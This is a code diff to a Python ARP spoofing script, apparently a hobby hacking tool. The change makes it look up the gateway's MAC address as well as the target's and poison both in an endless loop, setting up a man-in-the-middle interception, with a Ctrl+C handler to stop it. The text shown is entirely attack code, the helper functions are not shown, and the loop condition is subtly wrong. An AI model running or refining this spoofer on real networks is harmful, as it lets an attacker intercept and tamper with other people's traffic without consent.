@@ -37,20 +37,28 @@ def main():
         return None
     
     #Search for the MAC address of the trget
-    target_mac = None
+    target_mac,getway_mac = None,None
     print(Fore.YELLOW+"Searching for the MAC address...")
-    while not target_mac:
+    while not target_mac and not getway_mac:
         target_mac = get_MAC(target_ip)
+        getway_mac = get_MAC(getway_ip)
 
     #Logs for terminal
     print(Fore.GREEN+"MAC address was found!")
-    print(Fore.YELLOW+"The MAC adress is:{}".format(target_mac))
+    print(Fore.YELLOW+"The MAC (traget) adress is: {}".format(target_mac))
+    print(Fore.YELLOW+"The MAC (getway) adress is: {}".format(getway_mac))
     print(Fore.BLUE+"spoofer is active!")
-    Fore.RESET
 
     #Start the spoof function in endless loop
-    while True:
-        spoof(target_ip,target_mac,getway_ip)
+    try:
+        while True:
+            spoof(target_ip,target_mac,getway_ip)
+            spoof(getway_ip,getway_mac,target_ip)
+    #Stop spoofing by pressing Ctrl+C
+    except KeyboardInterrupt:
+        print(Fore.BLUE+"spoofing finished.")
+        
+    Fore.RESET
 
 if __name__=="__main__":
     main()
